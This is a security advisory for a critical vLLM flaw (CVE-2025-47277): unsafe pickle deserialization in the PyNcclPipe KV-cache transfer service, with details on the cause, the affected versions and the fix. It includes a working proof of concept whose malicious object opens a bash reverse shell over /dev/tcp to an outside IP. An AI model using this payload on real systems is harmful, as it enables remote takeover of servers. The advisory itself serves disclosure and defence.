# vLLM Allows Remote Code Execution via PyNcclPipe Communication Service

**GHSA**: GHSA-hjq4-87xh-g4fv | **CVE**: CVE-2025-47277 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-502

**Affected Packages**:
- **vllm** (pip): >= 0.6.5, < 0.8.5

## Description

### Impacted Environments

This issue ONLY impacts environments using the `PyNcclPipe` KV cache transfer integration with the V0 engine. No other configurations are affected.

### Summary
vLLM supports the use of the `PyNcclPipe` class to establish a peer-to-peer communication domain for data transmission between distributed nodes. The GPU-side KV-Cache transmission is implemented through the `PyNcclCommunicator` class, while CPU-side control message passing is handled via the `send_obj` and `recv_obj` methods on the CPU side.​ 

A remote code execution vulnerability exists in the `PyNcclPipe` service. Attackers can exploit this by sending malicious serialized data to gain server control privileges. 

The intention was that this interface should only be exposed to a private network using the IP address specified by the `--kv-ip` CLI parameter. The vLLM documentation covers how this must be limited to a secured network: https://docs.vllm.ai/en/latest/deployment/security.html

Unfortunately, the default behavior from PyTorch is that the `TCPStore` interface will listen on ALL interfaces, regardless of what IP address is provided. The IP address given was only used as a client-side address to use. vLLM was fixed to use a workaround to force the `TCPStore` instance to bind its socket to a specified private interface.

This issue was reported privately to PyTorch and they determined that this behavior was intentional.

### Details
The `PyNcclPipe`  implementation contains a critical security flaw where it directly processes client-provided data using `pickle.loads`  , creating an unsafe deserialization vulnerability that can lead to ​Remote Code Execution.

1. Deploy a `PyNcclPipe` service configured to listen on port `18888` when launched:
```python
from vllm.distributed.kv_transfer.kv_pipe.pynccl_pipe import PyNcclPipe
from vllm.config import KVTransferConfig

config=KVTransferConfig(
    kv_ip="0.0.0.0",
    kv_port=18888,
    kv_rank=0,
    kv_parallel_size=1,
    kv_buffer_size=1024,
    kv_buffer_device="cpu"
)

p=PyNcclPipe(config=config,local_rank=0)
p.recv_tensor() # Receive data
```

2. The attacker crafts malicious packets and sends them to the `PyNcclPipe` service:

```python
from vllm.distributed.utils import StatelessProcessGroup

class Evil:
    def __reduce__(self):
        import os
        cmd='/bin/bash -c "bash -i >& /dev/tcp/172.28.176.1/8888 0>&1"'
        return (os.system,(cmd,))

client = StatelessProcessGroup.create(
    host='172.17.0.1',
    port=18888,
    rank=1,
    world_size=2,
)

client.send_obj(obj=Evil(),dst=0)
```

The call stack triggering ​RCE is as follows:

```
vllm.distributed.kv_transfer.kv_pipe.pynccl_pipe.PyNcclPipe._recv_impl
	-> vllm.distributed.kv_transfer.kv_pipe.pynccl_pipe.PyNcclPipe._recv_metadata
		-> vllm.distributed.utils.StatelessProcessGroup.recv_obj
			-> pickle.loads 
```

Getshell as follows: 

![image](https://github.com/user-attachments/assets/487746ee-3b77-4e4d-99cc-d1ca08431215)

### Reporters

This issue was reported independently by three different parties:

* @kikayli (Zhuque Lab, Tencent)
* @omjeki
* Russell Bryant (@russellb)

### Fix

* https://github.com/vllm-project/vllm/pull/15988 -- vLLM now limits the `TCPStore` socket to the private interface as configured.
